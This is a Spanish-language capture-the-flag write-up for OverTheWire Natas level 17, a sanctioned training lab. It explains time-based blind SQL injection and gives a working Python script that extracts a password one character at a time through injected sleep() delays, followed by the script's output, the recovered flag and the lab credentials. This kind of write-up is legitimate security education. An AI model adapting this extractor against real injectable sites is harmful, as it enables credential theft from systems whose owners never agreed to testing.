#Natas Level 16 → Level 17

Username: natas17

URL:      http://natas17.natas.labs.overthewire.org

##Write Up Iker

Abrimos un navegador y nos conectamos a la página: 

- **URL        : http://natas17.natas.labs.overthewire.org** 
- **Usuario    : natas17**
- **Contraseña : 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw**

La contraseña la hemos sacado del nivel anterior.

Entramos a la web y nos muestra un campo donde tenemos que meter el nombre de un usuario. Este reto se parece mucho al nivel 15.

Antes de hacer nada vamos a mirar el código fuente del reto:

```php
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 
```

Introducimos el nombre del usuario **natas17** para ver que resultado nos da pero no obtenemos ningún mensaje. Probamos con algún otro usuario y tampoco.

Si nos fijamos bien en el código fuente, observamos que los campos para mostrar mensajes **están comentados!** Y es por eso que no nos muestra ningún mensaje.

¿Entonces como podemos saber si el usuario existe o no existe como lo hicimos en el reto de **Natas15**?

La respuesta es no lo sabemos, pero sabemos de otras técnicas de **SQL Injection** que nos pueden servir para este reto.

Vamos a leer algo sobre este tipo de técnica: 

El atacante inyecta comandos SQL porque la aplicación es vulnerable a SQL injection pero nunca puede acceder a los resultados que devuelve la consulta porque la aplicación no los imprime. 
Sin embargo se puede apreciar un comportamiento distinto ante consultas que devuelven datos y consultas que no devuelven datos. 
A partir de este comportamiento distinto se intenta inyectar lógica para extraer la información en base a valores True o False.

**Boolean-based blind:** Se basa en una técnica que intenta extraer información carácter a carácter, insertando tras la consulta válida una consulta de tipo SELECT que comprobará si el carácter solicitado se corresponde con el carácter almacenado en la BD.
**Time-based blind:** Utilizando un principio similar a la técnica anterior, esta vez la consulta SELECT introduce un delay en la BD que solo se ejecutará en el caso de que se cumpla la condición que posteriormente le permitirá al atacante obtener una respuesta de válido o inválido gracias a las esperas en la presentación de los resultados.

Una vez que hemos entendido la técnica, vamos a utilizar un **sleep(2)** en la consulta para saber si es **Verdadero** o **Falso**

Si el resultado es positivo, sabremos que la letra del password es correcta. Si por el contrario nos devuelve un valor **Falso** sabremos que no existe esa letra.

NOTA: Para esta prueba he necesitado leer mucho acerca de **Time-Based SQL Injection** ya que nunca había realizado un ataque así manualmente. He buscado ejemplos en muchos foros y por eso se me a complicado el reto. De todas formas al final lo he conseguido que es lo que importa :smile: 
 
Escribimos el script y lo llamaremos **blindNatas17Injector.py**

```python
import httplib2
import urllib
import time
 
h = httplib2.Http()
h.add_credentials('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
 
passTemporal        = "";
letras              = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
posicion            = 0

contUsuarioExiste   = 0
contUsuarioNoExiste = 0

while posicion < len(letras):
        payload = "natas18\" AND if(password LIKE BINARY \"" + passTemporal + letras[posicion] + "%\", sleep(2), 0);# "
        query = urllib.urlencode(dict(username=payload))
        start = time.time()
        resp, contenido = h.request("http://natas17.natas.labs.overthewire.org/index.php?" + query, method="POST")
        end = time.time()
        if end - start >= 2:
                passTemporal += letras[posicion];
                print("Nueva password encontrada: " + passTemporal)
                posicion = 0
                contUsuarioExiste +=1
                if (len(passTemporal)==32):
                        break;
                continue
        else:
                contUsuarioNoExiste +=1
        posicion += 1

print "-"*70
print "Pruebas Erroneas       = {0}".format(contUsuarioNoExiste)
print "Pruebas Satisfactorias = {0}".format(contUsuarioExiste)
print "-"*70
print "Password Natas16 = {0}".format(passTemporal)
print "-"*70
```

Lo ejecutamos y vamos viendo lo que sale en la consola:

```bash
ikerburguera@:~/Desktop$ python blindNatas17Injector.py 
Nueva password encontrada: x
Nueva password encontrada: xv
Nueva password encontrada: xvK
Nueva password encontrada: xvKI
Nueva password encontrada: xvKIq
Nueva password encontrada: xvKIqD
Nueva password encontrada: xvKIqDj
Nueva password encontrada: xvKIqDjy
Nueva password encontrada: xvKIqDjy4
Nueva password encontrada: xvKIqDjy4O
Nueva password encontrada: xvKIqDjy4OP
Nueva password encontrada: xvKIqDjy4OPv
Nueva password encontrada: xvKIqDjy4OPv7
Nueva password encontrada: xvKIqDjy4OPv7w
Nueva password encontrada: xvKIqDjy4OPv7wC
Nueva password encontrada: xvKIqDjy4OPv7wCR
Nueva password encontrada: xvKIqDjy4OPv7wCRg
Nueva password encontrada: xvKIqDjy4OPv7wCRgD
Nueva password encontrada: xvKIqDjy4OPv7wCRgDl
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlm
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0p
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pF
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFs
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFsC
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFsCs
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFsCsD
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFsCsDj
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd
Nueva password encontrada: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
----------------------------------------------------------------------
Pruebas Erroneas       = 734
Pruebas Satisfactorias = 32
----------------------------------------------------------------------
Password Natas16 = xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
----------------------------------------------------------------------
```

Y nos devuelve la contraseña :sunglasses: :beers:

**FLAG** = {xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP}



